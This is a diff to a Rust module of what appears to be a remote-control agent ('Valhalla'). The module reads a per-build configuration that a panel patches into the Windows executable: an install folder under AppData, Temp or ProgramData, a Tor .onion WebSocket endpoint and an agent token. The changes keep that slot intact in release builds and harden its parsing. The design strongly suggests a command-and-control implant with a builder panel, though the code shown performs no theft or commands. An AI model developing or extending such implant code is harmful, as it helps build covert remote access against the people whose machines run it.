@@ -2,11 +2,12 @@ use std::{fs, path::PathBuf};
 
 use crate::transport::Endpoint;
 
-// Layout of the configuration block embedded in the PE binary.
-// The panel writes these bytes at the defined sentinel offsets.
+// Layout of the configuration region embedded in the PE binary.
+// The panel patches the payload after the magic + slot tag.
 //
 // Magic sentinel (8 bytes): b"VLHCFG\x00\x01"
-// Followed immediately by:
+// Slot tag:               b"VALHALLA-CFG-SLOT-V1\x00"
+// Followed by the configuration payload:
 //   [0]     install_dir: u8       (0=Roaming, 1=Local, 2=Temp, 3=ProgramFiles, 4=ProgramData)
 //   [1..2]  folder_name_len: u16 little-endian
 //   [3..3+folder_name_len]  folder_name: UTF-8
@@ -14,13 +15,22 @@ use crate::transport::Endpoint;
 //   then:   onion: UTF-8
 //   then:   agent_token_len: u16
 //   then:   agent_token: UTF-8
+//
+// The entire region is 4096 bytes so the panel never has to overwrite
+// executable instructions or unrelated PE data when patching an agent.
 
 const MAGIC: &[u8; 8] = b"VLHCFG\x00\x01";
+const SLOT_TAG: &[u8] = b"VALHALLA-CFG-SLOT-V1\x00";
+const CONFIG_REGION_SIZE: usize = 4096;
+const CONFIG_PAYLOAD_OFFSET: usize = MAGIC.len() + SLOT_TAG.len();
 const BLOCK_SEARCH_MAX: usize = 64 * 1024 * 1024; // only scan first 64 MiB
 
-// Default values used when a config block cannot be located (development / test builds).
-const DEFAULT_ONION: &str = "";
-const DEFAULT_FOLDER: &str = "Einherjar";
+// Cargo build.rs emits a dedicated, zero-filled configuration slot into every
+// agent binary.  Keep both a linker-use marker and a real reference so
+// release/LTO builds cannot discard the slot that the panel patches.
+#[used]
+static EMBEDDED_CONFIG_REGION: [u8; CONFIG_REGION_SIZE] =
+    *include_bytes!(concat!(env!("OUT_DIR"), "/valhalla_config_region.bin"));
 
 #[derive(Clone, Debug)]
 pub enum InstallDir {
@@ -65,27 +75,22 @@ pub struct Config {
 /// Read configuration from the running executable image.
 /// Returns (Endpoint, display_string, InstallDir, folder_name, agent_token).
 pub(crate) fn load_config() -> Result<(Endpoint, String, InstallDir, String, String), String> {
+    // Keep the linker-visible configuration slot in the final PE image.
+    std::hint::black_box(&EMBEDDED_CONFIG_REGION);
+
     let exe = std::env::current_exe()
-        .map_err(|_| String::new())?;
+        .map_err(|e| format!("failed to locate current executable: {e}"))?;
     let bytes = fs::read(&exe)
-        .map_err(|_| String::new())?;
+        .map_err(|e| format!("failed to read executable image: {e}"))?;
 
-    let cfg = parse_config(&bytes).unwrap_or_else(|| Config {
-        install_dir: InstallDir::Local,
-        folder_name: DEFAULT_FOLDER.to_owned(),
-        onion: DEFAULT_ONION.to_owned(),
-        agent_token: String::new(),
-    });
-
-    if cfg.onion.is_empty() {
-        return Err(String::new());
-    }
+    let cfg = parse_config(&bytes)
+        .ok_or_else(|| "embedded configuration region was not found or is invalid".to_owned())?;
 
     let endpoint = Endpoint::parse(&cfg.onion)
-        .map_err(|_| String::new())?;
+        .map_err(|e| format!("invalid embedded endpoint: {e}"))?;
     let display = cfg.onion.clone();
     if cfg.agent_token.is_empty() {
-        return Err(String::new());
+        return Err("embedded agent authorization token is empty".to_owned());
     }
     Ok((endpoint, display, cfg.install_dir, cfg.folder_name, cfg.agent_token))
 }
@@ -101,11 +106,36 @@ pub(crate) fn load_endpoint() -> Result<(Endpoint, String), String> {
 fn parse_config(bytes: &[u8]) -> Option<Config> {
     let scan_limit = bytes.len().min(BLOCK_SEARCH_MAX);
     let haystack = &bytes[..scan_limit];
+    let mut search_from = 0usize;
 
-    // Find magic sentinel.
-    let pos = haystack.windows(MAGIC.len()).position(|w| w == MAGIC)?;
-    let mut cursor = pos + MAGIC.len();
+    // The magic also exists in the parser itself, so do not trust the first
+    // occurrence.  Walk every candidate and accept only a slot carrying the
+    // dedicated tag and a structurally valid, populated configuration block.
+    while search_from + MAGIC.len() <= haystack.len() {
+        let relative = haystack[search_from..]
+            .windows(MAGIC.len())
+            .position(|w| w == MAGIC)?;
+        let pos = search_from + relative;
 
+        let payload_start = pos + CONFIG_PAYLOAD_OFFSET;
+        let tag_start = pos + MAGIC.len();
+        let region_end = pos.checked_add(CONFIG_REGION_SIZE)?;
+        if region_end <= bytes.len()
+            && bytes.get(tag_start..payload_start)? == &SLOT_TAG[..]
+            && payload_start <= region_end
+        {
+            if let Some(cfg) = parse_config_payload(bytes, payload_start, region_end) {
+                return Some(cfg);
+            }
+        }
+
+        search_from = pos + 1;
+    }
+
+    None
+}
+
+fn parse_config_payload(bytes: &[u8], mut cursor: usize, region_end: usize) -> Option<Config> {
     let install_byte = *bytes.get(cursor)?;
     cursor += 1;
     let install_dir = InstallDir::from_byte(install_byte);
@@ -113,22 +143,32 @@ fn parse_config(bytes: &[u8]) -> Option<Config> {
     let folder_len = read_u16_le(bytes, cursor)? as usize;
     cursor += 2;
     if folder_len > 260 { return None; }
-    let folder_bytes = bytes.get(cursor..cursor + folder_len)?;
+    let folder_end = cursor.checked_add(folder_len)?;
+    if folder_end > region_end { return None; }
+    let folder_bytes = bytes.get(cursor..folder_end)?;
     let folder_name = std::str::from_utf8(folder_bytes).ok()?.to_owned();
-    cursor += folder_len;
+    cursor = folder_end;
 
     let onion_len = read_u16_le(bytes, cursor)? as usize;
     cursor += 2;
     if onion_len > 512 { return None; }
-    let onion_bytes = bytes.get(cursor..cursor + onion_len)?;
+    let onion_end = cursor.checked_add(onion_len)?;
+    if onion_end > region_end { return None; }
+    let onion_bytes = bytes.get(cursor..onion_end)?;
     let onion = std::str::from_utf8(onion_bytes).ok()?.trim().to_owned();
-    cursor += onion_len;
+    cursor = onion_end;
 
     let agent_token_len = read_u16_le(bytes, cursor)? as usize;
     cursor += 2;
     if agent_token_len > 256 { return None; }
-    let token_bytes = bytes.get(cursor..cursor + agent_token_len)?;
+    let token_end = cursor.checked_add(agent_token_len)?;
+    if token_end > region_end { return None; }
+    let token_bytes = bytes.get(cursor..token_end)?;
     let agent_token = std::str::from_utf8(token_bytes).ok()?.trim().to_owned();
+
+    if onion.is_empty() || agent_token.is_empty() {
+        return None;
+    }
 
     Some(Config { install_dir, folder_name, onion, agent_token })
 }
@@ -145,14 +185,13 @@ mod tests {
 
     fn make_block(dir: u8, folder: &str, onion: &str, token: &str) -> Vec<u8> {
         let mut v = MAGIC.to_vec();
+        v.extend_from_slice(SLOT_TAG);
         v.push(dir);
         let fb = folder.as_bytes();
-        v.push(fb.len() as u8);
-        v.push(0);
+        v.extend_from_slice(&(fb.len() as u16).to_le_bytes());
         v.extend_from_slice(fb);
         let ob = onion.as_bytes();
-        v.push(ob.len() as u8);
-        v.push(0);
+        v.extend_from_slice(&(ob.len() as u16).to_le_bytes());
         v.extend_from_slice(ob);
         let tb = token.as_bytes();
         v.extend_from_slice(&(tb.len() as u16).to_le_bytes());
@@ -183,5 +222,32 @@ mod tests {
     #[test]
     fn empty_bytes_returns_none() {
         assert!(parse_config(&[]).is_none());
+    }
+
+    #[test]
+    fn unconfigured_slot_is_rejected() {
+        let mut data = MAGIC.to_vec();
+        data.extend_from_slice(SLOT_TAG);
+        data.extend_from_slice(&[0u8; CONFIG_REGION_SIZE - CONFIG_PAYLOAD_OFFSET]);
+        assert!(parse_config(&data).is_none());
+    }
+
+    #[test]
+    fn skips_unrelated_magic_before_the_real_configuration_slot() {
+        let valid = make_block(1, "Einherjar", "ws://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.onion:443/", "token");
+        let mut data = MAGIC.to_vec();
+        data.extend_from_slice(b"not-a-config-slot");
+        data.extend_from_slice(&[0u8; 128]);
+        data.extend_from_slice(&valid);
+
+        let cfg = parse_config(&data).expect("should skip unrelated magic");
+        assert_eq!(cfg.folder_name, "Einherjar");
+        assert_eq!(cfg.agent_token, "token");
+    }
+
+    #[test]
+    fn config_region_has_room_for_maximum_payload() {
+        let max_payload = 1 + 2 + 260 + 2 + 512 + 2 + 256;
+        assert!(CONFIG_PAYLOAD_OFFSET + max_payload <= CONFIG_REGION_SIZE);
     }
 }
